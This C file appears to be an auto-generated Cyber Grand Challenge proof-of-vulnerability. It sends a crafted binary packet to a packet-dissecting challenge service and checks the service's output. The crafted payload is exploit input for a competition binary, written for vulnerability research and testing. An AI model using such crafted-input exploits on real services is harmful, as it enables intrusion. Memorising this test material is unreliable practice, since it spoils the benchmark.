#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x0b\xa5\xe4\x80"
         "\x4b\x01\x00\xbe\xab\xbf\x86\xce\x3f\xc6\x72\x42\xd8\xaf\xf7\x61"
         "\x76\x01\x00\x00\x44\x47\x71\x9f\x47\x66\xb6\x72\x25\x4e\xc3\xcd"
         "\x7f\xc5\x86\xc9\xc4\x9a\x27\x62\x45\x13\x23\x59\xba\x04\x3c\x79"
         "\x91\xcb\x7e\x00\xfb\x75\xab\x25\x55\xb8\xdc\x95\xcf\x9e\x28\x7a"
         "\x62\x7f\xdd\x8e\x8d\x3b\x10\xe0\x0b\x08\x7a\x95\x98\xb1\x82\xc5"
         "\x62\x3f\xdc\x66\xb7\x31\x4e\xf7\x06\xe3\x4a\xb5\x86\x22\x5e\xaa"
         "\x8a\x35\xf0\x6b\x0c\xa0\x37\xb5\x6f\x6c\x89\xf4\xef\x32\xe7\x52"
         "\x69\xd0\x65\x8f\x05\x55\x34\xdf\xee\x42\xae\x54\x2b\xb3\xf4\xcb"
         "\x08\x7a\xb3\x22\x0a\x8b\x47\xe5\x0d\x99\x14\xd6\xc7\xf3\x15\xa3"
         "\x1f\xd5\xe4\xfc\x70\xb1\x33\x36\x9a\x12\xa9\xca\x1e\xfe\x6c\x00"
         "\x16\xb9\xf3\xd3\x5d\x7e\xe6\x4c\x24\x42\xa0\xc6\xc7\xb4\x67\x01"
         "\x68\x3f\xec\x4a\x88\xc6\xce\x24\xc0\x4c\x88\x05\x7b\x96\xd7\xa7"
         "\x84\x61\x84\x1a\x2d\xb1\x3a\x7a\xcf\xf5\x4b\x87\x04\x72\xff\xd4"
         "\xf6\x67\x12\x84\x4e\x52\xa2\x49\x1c\x7b\x75\x11\x76\x1b\x28\x28"
         "\x26\x57\xcc\xf0\x61\x8a\xb2\xd5\x2f\x33\x01\xd5\x75\xa5\xa5\xdc"
         "\xa1\x40\xd6\x18\x6a\xe7\xef\xee\xc2\x10\xc2\x60\x81\x18\x41\xaa"
         "\x02\x7b\x88\x05\x36\x70\xd7\x85\x8e\x30\x94\xd3\x44\x00\x41\x40"
         "\xf1\x03\x44\x00\x4b\xcf\x4b\x1b\xe4\xde\x66\xda\xd1\xdb\xbe\x39"
         "\x62\xc9\x47\x07\x75\xda\xd6\xe2\x9f\xd6\x96\xce\xeb\x35\x03\x8b"
         "\xf7\xc1\x04\x0f\x86\x30\xd2\x02\x98\x61\xfb\x68\x74\xdb\xe9\x3f"
         "\x66\x7d\xe2\x64\xe1\xeb\x0c\xa6\x24\x68\x4c\x94\xfa\x79\x4e\xad"
         "\xcf\xd4\xb5\x03\xff\xe4\x31\x17\x2c\xb6\x55\xe8\xfc\x5c\xee\x47"
         "\xa6\x5c\x2d\xb9\xf7\x6a\x6f\xfd\x02\x0f\x06\xd5\x7f\xfe\x2b\x3b"
         "\x72\x2e\xd6\x5b\x58\x87\xab\x4e\x3b\x16\x0c\x6a\xf0\x72\x56\x3c"
         "\x09\xe7\xc8\x82\x43\x43\x94\x11\x3b\xee\xe0\xc4\x8b\x60\xed\x7e"
         "\x0a\x4e\x5f\x41\xa2\xdf\xa7\x1d\xfe\x90\x50\x62\x35\x23\xe8\xaf"
         "\x62\xc8\x51\x3a\xa2\x58\x0e\xc7\xb4\xf3\xe7\xee\x2d\x63\xba\x33"
         "\xc2\x31\x94\x44\xa5\x48\x65\xc6\xc5\xf8\x22\x52\x70\x08\x17\x9b"
         "\xa6\x02\x93\xa3\xbf\xb3\x46\x12\x3f\xeb\xb0\x5c\xc7\xee\x33\xd0"
         "\x4a\x62\x59\xdc\x80\xc4\xa7\x7d\xd1\xf0\x74\x08\xae\x77\xc8\x75"
         "\x3c\x1e\x66\x5d\xbf\x6a\x3e\xa3\x35\x1c\x31\x81\x8c\xf1\xee\x2c"
         "\x8b\x18\xc5\xb8\x88\xcc\x23\x88\x0f\x4a\x21\x10\x35\xaa\x4b\x84"
         "\x05\x21\x86\x6f\xdd\xd3\x35\x86\x7f\xc6\xfe\x3a\x5a\x95\x15\xc3"
         "\x46\x63\x42\x5d\x85\xcc\xff\x65\x0a\x94\x4d\x92\x18\xab\xa7\xc6"
         "\xd5\x3f\x53\xa7\xae\x1d\x81\x67\xe3\x3b\xf4\xdc\x6d\x42\x06\x5e"
         "\x6c\x3f\x07\x83\x91\xbc\x6a\x74\xf9\x35\x81\xe4\xd1\x33\xfe\x96"
         "\xe0\x45\xcf\x57\xba\xa7\x48\xa0\x7b\x8c\xac\x46\x5c\x7a\x99\xba"
         "\x47\xed\xf1\xba\xcf\x8f\xac\xd4\x83\x2c\xdf\x1c\x20\xc8\x08\x31"
         "\x61\x36\x1e\x35\xe2\x2d\x06\x21\x8c\xb7\x33\x03\xc5\x6a\xe4\xb8"
         "\x57\xda\x8b\x6b\x57\xa7\x5e\x5f\x95\x32\x86\x51\x01\xff\x67\x0e"
         "\x68\x6a\x18\xa7\x17\xa5\xa6\x82\xb2\x57\xc2\x17\x33\x3d\xe7\x6b"
         "\x73\x54\x6c\xd2\xe1\x3f\xa2\x36\xc0\xe1\xa2\xbd\x70\x11\x92\x26"
         "\xd3\xee\xcb\x95\x5a\x1d\x3d\x58\x9b\xd2\x20\xf1\xb5\x43\x47\xb3"
         "\xca\x9c\xfc\xaa\xf3\x06\x87\x49\x22\xbc\x6c\xda\x88\x57\x39\x6a"
         "\xc2\xdf\x66\xad\xcd\xb9\x99\xf5\x37\xe4\x58\xed\x0a\x8a\xc3\xcf"
         "\xf2\x9f\x4e\x30\xe1\xc4\x0d\xf5\x1b\xca\x71\x63\xa9\x90\x0b\x1b"
         "\xec\xbd\x82\x56\x2f\xcb\x82\x51\x44\x74\x78\x65\x4e\x90\x0c\x60"
         "\x5a\xe1\x33\x3c\xc7\x61\x02\x6b\x66\xcc\x9d\xeb\x5c\xd9\x38\xc2"
         "\x7a\x71\x6c\x52\xdd\xd4\xae\x02\x56\x9e\x3d\xd1\x47\x23\xd0\x9e"
         "\x4a\xdd\x0d\x19\x57\x64\xc9\xa0\xfa\x0e\x9d\x1b\x6b\xe1\xea\x2d"
         "\x71\x05\x95\x45\xfd\x4e\xf2\x82\x92\x87\xff\x65\xd8\x6e\x2b\x21"
         "\xa5\x4d\xd8\x39\xea\x16\x3d\xd6\x19\xf8\x80\x80\x8f\xb3\x29\x11"
         "\x72\x58\xa4\x59\xd8\x30\xf6\x77\x2e\xac\x92\x9d\x74\x5d\xc5\x86"
         "\xf2\xbf\xb2\x6d\x0c\x1d\x91\xa3\x25\x44\x24\x33\xb7\x94\x1c\xd6"
         "\x9a\x40\x2c\xa2\x6e\x79\x6b\x93\x44\x00\x44\x00\xe1\xe5\xab\x55"
         "\x2a\xba\xcd\x6c\x13\xd8\x2d\x52\x85\xbd\xeb\xef\xb5\x35\x30\x22"
         "\x99\x97\x01\xcc\xd0\x1a\x6d\x17\x44\xe9\xd8\xed\x85\xbc\xcd\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===rofl
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x72\x6f\x66\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===skilderprothalline
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x73\x6b\x69\x6c\x64\x65\x72\x70\x72\x6f\x74"
         "\x68\x61\x6c\x6c\x69\x6e\x65";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
